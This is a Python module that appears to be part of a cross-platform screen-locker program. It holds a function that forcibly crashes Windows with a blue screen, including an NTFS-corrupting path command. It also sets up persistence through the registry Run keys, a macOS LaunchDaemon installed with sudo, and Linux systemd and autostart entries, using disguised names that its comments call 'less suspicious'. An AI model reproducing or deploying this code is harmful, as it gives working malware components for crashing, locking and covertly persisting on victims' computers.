#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import getpass
import os
import platform
import subprocess
import ctypes
import ctypes.wintypes
import logging
import sys

# Configure logging (completely disabled)
logging.basicConfig(level=logging.CRITICAL, handlers=[logging.NullHandler()])

def bsod():
    """Trigger a Blue Screen of Death (Windows only) with error handling."""
    try:
        if platform.system() != "Windows":
            logging.warning("BSOD function only works on Windows")
            return False
            
        # Warning: This is a potentially destructive operation
        logging.warning("Attempting to trigger BSOD - this will crash the system")
        
        subprocess.call("cd C:\\:$i30:$bitmap", shell=True)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        
    except Exception as e:
        logging.error(f"Failed to trigger BSOD: {e}")
        return False
    return True


def startup(path):
    """Add program to startup with registry/system persistence and error handling."""
    try:
        system = platform.system()
        
        if system == "Windows":
            return _startup_windows_registry(path)
        elif system == "Darwin":  # macOS
            return _startup_macos_system(path)
        elif system == "Linux":
            return _startup_linux_system(path)
        else:
            return False
            
    except Exception as e:
        return False


def _startup_windows_registry(path):
    """Setup Windows startup using registry entries."""
    try:
        import winreg
        
        # Use HKEY_CURRENT_USER for user-level persistence
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        # Open the registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Set the registry value
        app_name = "WindowsSecurityService"  # Less suspicious name
        if path.endswith('.py'):
            command = f'python "{path}"'
        else:
            command = f'"{path}"'
            
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        
        # Store registry info globally for cleanup
        global registry_info
        registry_info = {
            'key_path': key_path,
            'value_name': app_name,
            'root_key': winreg.HKEY_CURRENT_USER
        }
        
        return True
        
    except Exception as e:
        # Fallback to HKEY_LOCAL_MACHINE if HKEY_CURRENT_USER fails
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            
            app_name = "WindowsSecurityService"
            if path.endswith('.py'):
                command = f'python "{path}"'
            else:
                command = f'"{path}"'
                
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            
            registry_info = {
                'key_path': key_path,
                'value_name': app_name,
                'root_key': winreg.HKEY_LOCAL_MACHINE
            }
            
            return True
        except Exception as e2:
            return False


def _startup_macos_system(path):
    """Setup macOS startup using system-level LaunchDaemons (more persistent)."""
    try:
        # Use LaunchDaemons for system-wide persistence (more robust)
        plist_dir = "/Library/LaunchDaemons"  # System-wide instead of user-specific
        plist_name = "com.apple.security.screenlock.plist"  # Less suspicious name
        plist_path = os.path.join(plist_dir, plist_name)
        
        # Check if we have permission to write to system directory
        if not os.access(plist_dir, os.W_OK):
            # Fallback to user LaunchAgents if system access denied
            return _startup_macos_user(path)
        
        # Handle both .py and .app files properly
        if path.endswith('.py'):
            program_args = ['python3', path]
        else:
            program_args = ['open', '-a', path] if path.endswith('.app') else [path]
        
        args_xml = '\n        '.join([f'<string>{arg}</string>' for arg in program_args])
        
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.security.screenlock</string>
    <key>ProgramArguments</key>
    <array>
        {args_xml}
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>LaunchOnlyOnce</key>
    <false/>
</dict>
</plist>'''
        
        # Write with sudo if needed
        try:
            with open(plist_path, "w") as plist_file:
                plist_file.write(plist_content)
        except PermissionError:
            # Use subprocess to write with elevated privileges
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.plist') as temp_file:
                temp_file.write(plist_content)
                temp_path = temp_file.name
            
            subprocess.run(['sudo', 'mv', temp_path, plist_path], check=True)
            subprocess.run(['sudo', 'chown', 'root:wheel', plist_path], check=True)
            subprocess.run(['sudo', 'chmod', '644', plist_path], check=True)
        
        # Load the launch daemon
        subprocess.run(['sudo', 'launchctl', 'load', plist_path], check=True)
        
        global registry_info
        registry_info = {
            'plist_path': plist_path,
            'is_daemon': True
        }
        
        return True
        
    except Exception as e:
        # Fallback to user-level if system-level fails
        return _startup_macos_user(path)


def _startup_macos_user(path):
    """Fallback macOS startup using user LaunchAgents."""
    try:
        user_name = getpass.getuser()
        plist_dir = f"/Users/{user_name}/Library/LaunchAgents"
        plist_name = "com.apple.security.screenlock.plist"
        plist_path = os.path.join(plist_dir, plist_name)
        
        if not os.path.exists(plist_dir):
            os.makedirs(plist_dir)
        
        # Handle both .py and .app files properly
        if path.endswith('.py'):
            program_args = ['python3', path]
        else:
            program_args = ['open', '-a', path] if path.endswith('.app') else [path]
        
        args_xml = '\n        '.join([f'<string>{arg}</string>' for arg in program_args])
        
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.security.screenlock</string>
    <key>ProgramArguments</key>
    <array>
        {args_xml}
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
        
        with open(plist_path, "w") as plist_file:
            plist_file.write(plist_content)
        
        # Load the launch agent
        subprocess.run(["launchctl", "load", plist_path], check=True)
        
        global registry_info
        registry_info = {
            'plist_path': plist_path,
            'is_daemon': False
        }
        
        return True
        
    except Exception as e:
        return False


def _startup_linux_system(path):
    """Setup Linux startup using systemd service (more persistent than desktop entries)."""
    try:
        # Try to create a systemd user service first
        user_home = os.path.expanduser("~")
        systemd_user_dir = os.path.join(user_home, ".config", "systemd", "user")
        
        if not os.path.exists(systemd_user_dir):
            os.makedirs(systemd_user_dir)
        
        service_name = "screenlock-security.service"
        service_path = os.path.join(systemd_user_dir, service_name)
        
        # Handle both .py and executable files properly
        if path.endswith('.py'):
            exec_command = f'/usr/bin/python3 "{path}"'
        else:
            exec_command = f'"{path}"'
        
        service_content = f'''[Unit]
Description=Screen Security Service
After=graphical-session.target

[Service]
Type=simple
ExecStart={exec_command}
Restart=always
RestartSec=10
Environment=DISPLAY=:0

[Install]
WantedBy=default.target'''
        
        with open(service_path, "w") as service_file:
            service_file.write(service_content)
        
        # Enable and start the service
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "--user", "enable", service_name], check=True)
        subprocess.run(["systemctl", "--user", "start", service_name], check=False)  # Don't fail if can't start immediately
        
        global registry_info
        registry_info = {
            'service_path': service_path,
            'service_name': service_name,
            'is_systemd': True
        }
        
        return True
        
    except Exception as e:
        # Fallback to desktop entry method
        return _startup_linux_desktop(path)


def _startup_linux_desktop(path):
    """Fallback Linux startup using desktop entry (autostart)."""
    try:
        user_home = os.path.expanduser("~")
        autostart_dir = os.path.join(user_home, ".config", "autostart")
        
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
        
        desktop_file_path = os.path.join(autostart_dir, "screenlock-security.desktop")
        
        # Handle both .py and executable files properly  
        if path.endswith('.py'):
            exec_command = f'python3 "{path}"'
        else:
            exec_command = f'"{path}"'
        
        desktop_content = f'''[Desktop Entry]
Type=Application
Name=Screen Security Service
Exec={exec_command}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
X-GNOME-Autostart-Delay=0
X-KDE-autostart-after=panel
X-MATE-Autostart-enabled=true'''
        
        with open(desktop_file_path, "w") as desktop_file:
            desktop_file.write(desktop_content)
        
        # Make desktop file executable
        os.chmod(desktop_file_path, 0o755)
        
        global registry_info
        registry_info = {
            'desktop_path': desktop_file_path,
            'is_systemd': False
        }
        
        return True
        
    except Exception as e:
        return False


def cleanup():
    """Remove startup entries and cleanup system with error handling."""
    try:
        system = platform.system()
        
        if system == "Windows":
            return _cleanup_windows()
        elif system == "Darwin":  # macOS
            return _cleanup_macos()
        elif system == "Linux":
            return _cleanup_linux()
        else:
            return False
            
    except Exception as e:
        return False


def _cleanup_windows():
    """Clean up Windows registry entries."""
    try:
        import winreg
        global registry_info
        
        if 'registry_info' in globals() and registry_info:
            # Remove registry entry using stored info
            try:
                key = winreg.OpenKey(registry_info['root_key'], registry_info['key_path'], 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, registry_info['value_name'])
                winreg.CloseKey(key)
                return True
            except Exception as e:
                pass
        
        # Fallback: try both registry locations with common names
        app_names = ["WindowsSecurityService", "screenlocker_startup"]
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        # Try HKEY_CURRENT_USER first
        for app_name in app_names:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, app_name)
                winreg.CloseKey(key)
                return True
            except Exception:
                pass
        
        # Try HKEY_LOCAL_MACHINE
        for app_name in app_names:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, app_name)
                winreg.CloseKey(key)
                return True
            except Exception:
                pass
        
        # Also clean up old bat files if they exist
        user_name = getpass.getuser()
        startup_folder = os.path.join(
            "C:\\Users", 
            user_name, 
            "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        )
        
        bat_files = ["screenlocker_startup.bat", "WindowsSecurityService.bat"]
        for bat_file in bat_files:
            bat_path = os.path.join(startup_folder, bat_file)
            if os.path.exists(bat_path):
                os.remove(bat_path)
        
        return True
        
    except Exception as e:
        return False


def _cleanup_macos():
    """Clean up macOS LaunchAgent/LaunchDaemon."""
    try:
        global registry_info
        
        if 'registry_info' in globals() and registry_info and 'plist_path' in registry_info:
            plist_path = registry_info['plist_path']
            is_daemon = registry_info.get('is_daemon', False)
            
            # Unload the launch agent/daemon
            if is_daemon:
                subprocess.run(['sudo', 'launchctl', 'unload', plist_path], check=False)
            else:
                subprocess.run(['launchctl', 'unload', plist_path], check=False)
            
            # Remove the plist file
            if is_daemon and os.path.exists(plist_path):
                subprocess.run(['sudo', 'rm', plist_path], check=False)
            elif os.path.exists(plist_path):
                os.remove(plist_path)
                
            return True
        
        # Fallback: try common locations
        user_name = getpass.getuser()
        plist_locations = [
            f"/Users/{user_name}/Library/LaunchAgents/com.apple.security.screenlock.plist",
            "/Library/LaunchDaemons/com.apple.security.screenlock.plist",
            f"/Users/{user_name}/Library/LaunchAgents/screenlocker.plist"
        ]
        
        for plist_path in plist_locations:
            if os.path.exists(plist_path):
                # Unload first
                if plist_path.startswith("/Library/LaunchDaemons/"):
                    subprocess.run(['sudo', 'launchctl', 'unload', plist_path], check=False)
                    subprocess.run(['sudo', 'rm', plist_path], check=False)
                else:
                    subprocess.run(['launchctl', 'unload', plist_path], check=False)
                    os.remove(plist_path)
        
        return True
        
    except Exception as e:
        return False


def _cleanup_linux():
    """Clean up Linux systemd service or desktop entry."""
    try:
        global registry_info
        
        if 'registry_info' in globals() and registry_info:
            if registry_info.get('is_systemd', False):
                # Clean up systemd service
                service_name = registry_info.get('service_name')
                service_path = registry_info.get('service_path')
                
                if service_name:
                    subprocess.run(["systemctl", "--user", "stop", service_name], check=False)
                    subprocess.run(["systemctl", "--user", "disable", service_name], check=False)
                    
                if service_path and os.path.exists(service_path):
                    os.remove(service_path)
                    
                subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
            else:
                # Clean up desktop entry
                desktop_path = registry_info.get('desktop_path')
                if desktop_path and os.path.exists(desktop_path):
                    os.remove(desktop_path)
            
            return True
        
        # Fallback: try common locations
        user_home = os.path.expanduser("~")
        
        # Clean up systemd service
        systemd_user_dir = os.path.join(user_home, ".config", "systemd", "user")
        service_names = ["screenlock-security.service", "screenlocker.service"]
        
        for service_name in service_names:
            service_path = os.path.join(systemd_user_dir, service_name)
            if os.path.exists(service_path):
                subprocess.run(["systemctl", "--user", "stop", service_name], check=False)
                subprocess.run(["systemctl", "--user", "disable", service_name], check=False)
                os.remove(service_path)
                
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
        
        # Clean up desktop entries
        autostart_dir = os.path.join(user_home, ".config", "autostart")
        desktop_names = ["screenlock-security.desktop", "screenlocker.desktop"]
        
        for desktop_name in desktop_names:
            desktop_path = os.path.join(autostart_dir, desktop_name)
            if os.path.exists(desktop_path):
                os.remove(desktop_path)
        
        return True
        
    except Exception as e:
        return False


def uninstall(window=None):
    """Remove from startup and clean up with cross-platform support."""
    try:
        # Destroy the window if provided
        if window:
            try:
                window.destroy()
            except Exception as e:
                pass
        
        # Remove startup entries
        cleanup()
        
        # Unhook keyboard handlers
        try:
            if platform.system() == "Windows":
                import keyboard
                keyboard.unhook_all()
        except ImportError:
            pass
        except Exception as e:
            pass
        
        return True
        
    except Exception as e:
        return False


def check_admin_privileges():
    """Check if running with administrator/root privileges."""
    try:
        system = platform.system()
        
        if system == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
            
    except Exception as e:
        return False


def get_system_info():
    """Get system information for logging purposes."""
    try:
        info = {
            'platform': platform.platform(),
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'admin_privileges': check_admin_privileges()
        }
        return info
    except Exception as e:
        return {}


# Global variable to store registry/system persistence info
registry_info = None






